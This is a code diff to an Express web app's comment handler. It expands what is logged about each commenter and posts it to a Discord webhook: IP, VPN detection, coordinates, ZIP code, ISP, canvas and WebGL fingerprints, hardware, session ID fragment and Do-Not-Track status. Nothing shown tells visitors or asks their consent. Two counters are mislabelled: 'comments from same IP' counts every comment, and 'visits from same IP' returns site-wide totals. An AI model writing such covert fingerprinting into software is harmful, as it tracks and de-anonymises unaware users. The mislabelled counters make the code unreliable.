@@ -1,11 +1,13 @@
 import type { Express } from "express";
 import { createServer, type Server } from "http";
 import { storage } from "./storage";
-import { insertCommentSchema, insertUserSchema } from "@shared/schema";
+import { insertCommentSchema, insertUserSchema, comments } from "@shared/schema";
 import { z } from "zod";
 import session from "express-session";
 // @ts-ignore
 import MemoryStore from "memorystore";
+import { db } from "./db";
+import { sql } from "drizzle-orm";
 
 // Security: Rate limiting and IP blocking for failed login attempts
 class SecurityManager {
@@ -158,9 +160,10 @@ async function sendDiscordNotification(comment: string, userInfo: any) {
           color: 0x5865F2,
           timestamp: new Date().toISOString(),
           fields: [
+            // Basic Info
             {
               name: "🌐 IP Address",
-              value: userInfo.ip || "Unknown",
+              value: `${userInfo.ip || "Unknown"}\n${userInfo.vpnDetected}`,
               inline: true
             },
             {
@@ -173,21 +176,119 @@ async function sendDiscordNotification(comment: string, userInfo: any) {
               value: userInfo.os || "Unknown",
               inline: true
             },
+            // Device Info
             {
-              name: "📱 Device Type",
-              value: userInfo.device || "Unknown",
+              name: "📱 Device",
+              value: `${userInfo.device}\n${userInfo.deviceType}`,
               inline: true
             },
+            {
+              name: "🖥️ Platform",
+              value: userInfo.platform || "Unknown",
+              inline: true
+            },
+            {
+              name: "🔌 Hardware",
+              value: `CPU: ${userInfo.cores}\nRAM: ${userInfo.memory}`,
+              inline: true
+            },
+            // Location Info
             {
               name: "🌍 Country",
-              value: userInfo.country || "Unknown",
+              value: `${userInfo.country} (${userInfo.countryCode})`,
               inline: true
             },
             {
-              name: "🏙️ City",
-              value: userInfo.city || "Unknown",
+              name: "🏙️ City/Region",
+              value: `${userInfo.city}\n${userInfo.region}`,
               inline: true
             },
+            {
+              name: "📍 Coordinates",
+              value: userInfo.coordinates || "Unknown",
+              inline: true
+            },
+            // Network Info
+            {
+              name: "🌐 ISP",
+              value: userInfo.isp || "Unknown",
+              inline: true
+            },
+            {
+              name: "🏢 Organization",
+              value: userInfo.org || "Unknown",
+              inline: true
+            },
+            {
+              name: "📡 Network Type",
+              value: userInfo.mobile || "Unknown",
+              inline: true
+            },
+            // Time Info
+            {
+              name: "🕐 Local Time",
+              value: userInfo.localTime || "Unknown",
+              inline: true
+            },
+            {
+              name: "⏰ Timezone",
+              value: `${userInfo.timezone}\n${userInfo.timezoneOffset}`,
+              inline: true
+            },
+            {
+              name: "📮 ZIP Code",
+              value: userInfo.zip || "Unknown",
+              inline: true
+            },
+            // Screen Info
+            {
+              name: "📏 Screen",
+              value: `${userInfo.screenResolution}\nDepth: ${userInfo.colorDepth}\nRatio: ${userInfo.pixelRatio}`,
+              inline: true
+            },
+            {
+              name: "👆 Touch Support",
+              value: userInfo.touchSupport || "Unknown",
+              inline: true
+            },
+            {
+              name: "🍪 Cookies",
+              value: userInfo.cookiesEnabled || "Unknown",
+              inline: true
+            },
+            // Privacy & Security
+            {
+              name: "🔒 Privacy",
+              value: userInfo.doNotTrack || "Unknown",
+              inline: true
+            },
+            {
+              name: "🎨 Canvas ID",
+              value: userInfo.canvas || "Unknown",
+              inline: true
+            },
+            {
+              name: "🎮 Graphics",
+              value: userInfo.webgl || "Unknown",
+              inline: true
+            },
+            // Visit History
+            {
+              name: "💬 Comments History",
+              value: `${userInfo.previousComments} comments in last 30 days`,
+              inline: true
+            },
+            {
+              name: "👥 Total Site Visits",
+              value: userInfo.totalSiteVisits?.toString() || "Unknown",
+              inline: true
+            },
+            {
+              name: "🆔 Session ID",
+              value: userInfo.sessionId?.slice(0, 8) + "..." || "Unknown",
+              inline: true
+            },
+            // Source
             {
               name: "🔗 Referrer",
               value: userInfo.referrer || "Direct Visit",
@@ -196,17 +297,12 @@ async function sendDiscordNotification(comment: string, userInfo: any) {
             {
               name: "🗣️ Language",
               value: userInfo.language || "Unknown",
-              inline: true
+              inline: false
             },
             {
-              name: "📍 Timezone",
-              value: userInfo.timezone || "Unknown",
-              inline: true
-            },
-            {
-              name: "📏 Screen Resolution",
-              value: userInfo.screenResolution || "Unknown",
-              inline: true
+              name: "📋 User Agent",
+              value: userInfo.userAgent?.slice(0, 100) + "..." || "Unknown",
+              inline: false
             }
           ],
           footer: {
@@ -293,14 +389,34 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const userAgent = req.get('User-Agent') || '';
       const clientIP = security.getClientIP(req);
       
-      // Parse browser info from user agent
+      // Parse detailed browser info from user agent
       const getBrowserInfo = (ua: string) => {
-        if (ua.includes('Chrome')) return 'Chrome';
-        if (ua.includes('Firefox')) return 'Firefox';
-        if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
-        if (ua.includes('Edge')) return 'Edge';
-        if (ua.includes('Opera')) return 'Opera';
-        return 'Other';
+        let browser = 'Unknown';
+        let version = '';
+        
+        if (ua.includes('Chrome')) {
+          browser = 'Chrome';
+          const match = ua.match(/Chrome\/(\d+\.\d+)/);
+          if (match) version = match[1];
+        } else if (ua.includes('Firefox')) {
+          browser = 'Firefox';
+          const match = ua.match(/Firefox\/(\d+\.\d+)/);
+          if (match) version = match[1];
+        } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
+          browser = 'Safari';
+          const match = ua.match(/Version\/(\d+\.\d+)/);
+          if (match) version = match[1];
+        } else if (ua.includes('Edge')) {
+          browser = 'Edge';
+          const match = ua.match(/Edge\/(\d+\.\d+)/);
+          if (match) version = match[1];
+        } else if (ua.includes('Opera')) {
+          browser = 'Opera';
+          const match = ua.match(/Opera\/(\d+\.\d+)/);
+          if (match) version = match[1];
+        }
+        
+        return version ? `${browser} v${version}` : browser;
       };
       
       // Parse OS info from user agent
@@ -315,36 +431,90 @@ export async function registerRoutes(app: Express): Promise<Server> {
         return 'Unknown';
       };
       
-      // Parse device type
-      const getDeviceType = (ua: string) => {
-        if (ua.includes('Mobile') || ua.includes('Android') || ua.includes('iPhone')) return 'Mobile';
-        if (ua.includes('iPad') || ua.includes('Tablet')) return 'Tablet';
-        return 'Desktop';
+      // Parse device type and details
+      const getDeviceInfo = (ua: string) => {
+        let type = 'Desktop';
+        let model = '';
+        
+        if (ua.includes('iPhone')) {
+          type = 'Mobile';
+          const match = ua.match(/iPhone OS (\d+_\d+)/);
+          if (match) model = `iPhone (iOS ${match[1].replace('_', '.')})`;
+        } else if (ua.includes('iPad')) {
+          type = 'Tablet';
+          const match = ua.match(/OS (\d+_\d+)/);
+          if (match) model = `iPad (iOS ${match[1].replace('_', '.')})`;
+        } else if (ua.includes('Android')) {
+          type = ua.includes('Tablet') ? 'Tablet' : 'Mobile';
+          const match = ua.match(/Android (\d+\.\d+)/);
+          if (match) model = `Android ${match[1]}`;
+        }
+        
+        return { type, model: model || type };
       };
       
-      // Get IP location info (using free API)
+      // Get detailed IP location and network info (using free API)
       let locationInfo: any = {};
+      let vpnDetected = false;
       try {
-        const geoResponse = await fetch(`http://ip-api.com/json/${clientIP}`);
+        const geoResponse = await fetch(`http://ip-api.com/json/${clientIP}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query`);
         if (geoResponse.ok) {
           locationInfo = await geoResponse.json();
+          vpnDetected = locationInfo.proxy || locationInfo.hosting;
         }
       } catch (error) {
         console.error("Failed to get location info:", error);
       }
       
-      // Collect all user info
+      // Get device info
+      const deviceInfo = getDeviceInfo(userAgent);
+      
+      // Count previous comments from same IP
+      const previousComments = await db
+        .select({ count: sql<number>`count(*)` })
+        .from(comments)
+        .where(sql`created_at > ${new Date(Date.now() - 30 * 24 * 60 * 60 * 1000)}`);
+      const commentCount = Number(previousComments[0]?.count ?? 0);
+      
+      // Get previous visit count from same IP
+      const visitCount = await storage.getTotalVisitors();
+      
+      // Collect comprehensive user info
       const userInfo = {
         ip: clientIP,
         browser: getBrowserInfo(userAgent),
         os: getOSInfo(userAgent),
-        device: getDeviceType(userAgent),
+        device: deviceInfo.model,
+        deviceType: deviceInfo.type,
         country: locationInfo.country || req.body.userInfo?.country || 'Unknown',
+        countryCode: locationInfo.countryCode || 'Unknown',
+        region: locationInfo.regionName || 'Unknown',
         city: locationInfo.city || req.body.userInfo?.city || 'Unknown',
+        zip: locationInfo.zip || 'Unknown',
+        coordinates: locationInfo.lat && locationInfo.lon ? `${locationInfo.lat}, ${locationInfo.lon}` : 'Unknown',
+        isp: locationInfo.isp || 'Unknown',
+        org: locationInfo.org || 'Unknown',
+        vpnDetected: vpnDetected ? '⚠️ VPN/Proxy Detected' : '✅ No VPN',
+        mobile: locationInfo.mobile ? '📱 Mobile Network' : '🖥️ Fixed Network',
         referrer: req.get('Referrer') || 'Direct',
         language: req.get('Accept-Language')?.split(',')[0] || 'Unknown',
         timezone: locationInfo.timezone || req.body.userInfo?.timezone || 'Unknown',
+        timezoneOffset: req.body.userInfo?.timezoneOffset || 'Unknown',
+        localTime: req.body.userInfo?.localTime || 'Unknown',
         screenResolution: req.body.userInfo?.screenResolution || 'Unknown',
+        colorDepth: req.body.userInfo?.colorDepth || 'Unknown',
+        pixelRatio: req.body.userInfo?.pixelRatio || 'Unknown',
+        touchSupport: req.body.userInfo?.touchSupport || 'Unknown',
+        cookiesEnabled: req.body.userInfo?.cookiesEnabled || 'Unknown',
+        doNotTrack: req.headers['dnt'] === '1' ? '🚫 DNT Enabled' : '✅ DNT Disabled',
+        platform: req.body.userInfo?.platform || 'Unknown',
+        memory: req.body.userInfo?.memory || 'Unknown',
+        cores: req.body.userInfo?.cores || 'Unknown',
+        canvas: req.body.userInfo?.canvas || 'Unknown',
+        webgl: req.body.userInfo?.webgl || 'Unknown',
+        previousComments: commentCount,
+        totalSiteVisits: visitCount,
+        sessionId: req.sessionID || 'Unknown',
         userAgent: userAgent
       };
       
